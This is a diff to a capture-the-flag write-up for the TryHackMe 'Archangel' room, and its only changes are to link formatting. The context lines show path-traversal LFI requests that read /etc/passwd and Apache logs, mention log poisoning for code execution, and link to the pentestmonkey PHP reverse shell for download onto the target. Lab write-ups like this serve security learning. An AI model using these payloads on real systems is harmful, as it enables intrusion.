@@ -62,7 +62,7 @@ When we click the button a query variable appears in the url, here is our place 
 
 ![test-php-exec](/assets/images/thm/archangel/test-php-exec.png)
 
-I started testing some different methods to bypass LFI vulnerability using this amazing site `https://book.hacktricks.xyz/pentesting-web/file-inclusion` Here are some of the methods I tried which were unseccessfull
+I started testing some different methods to bypass LFI vulnerability using this amazing site <https://book.hacktricks.xyz/pentesting-web/file-inclusion> Here are some of the methods I tried which were unseccessfull
 
 ```
 http://mafialive.thm/test.php?view=/etc/passwd
@@ -87,7 +87,7 @@ We can decode the above using the following command
 echo PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg== | base64 -d
 ```
 
-or we can use this site `https://gchq.github.io/CyberChef/`
+or we can use this site <https://gchq.github.io/CyberChef/>
 
 ![decode](/assets/images/thm/archangel/decode.png)
 
@@ -111,7 +111,7 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 
 ![test-php-passwd](/assets/images/thm/archangel/test-php-passwd.png)
 
-Well done... we have found that there is a user  called archangel on the system. From here I didn't know what to do (when I have already finished the challenge I remembered that I could try to brute force SSH service but...), so I started searching about how we can proceed as we know that there is a LFI vulnerability (the solution is in `https://book.hacktricks.xyz/pentesting-web/file-inclusion` that I used earlier but whatever...) I found the following article `https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d` . In short it's an attack called LFI Poisoning that allowed us to inject a code to server log trough the HTTP headers. So, I tried to read the server's log file.
+Well done... we have found that there is a user  called archangel on the system. From here I didn't know what to do (when I have already finished the challenge I remembered that I could try to brute force SSH service but...), so I started searching about how we can proceed as we know that there is a LFI vulnerability (the solution is in <https://book.hacktricks.xyz/pentesting-web/file-inclusion> that I used earlier but whatever...) I found the following article <https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d> . In short it's an attack called LFI Poisoning that allowed us to inject a code to server log trough the HTTP headers. So, I tried to read the server's log file.
 
 ```
 http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..///var/log/apache2/access.log
@@ -134,7 +134,7 @@ This code allows us to execute any commands on the server. From here we can star
 python3 -m http.server
 ```
 
-I have used the following script `https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php` (change the IP address with your attacking host)
+I have used the following script <https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php> (change the IP address with your attacking host)
 
 Now we can download the script on the server using the following request
 
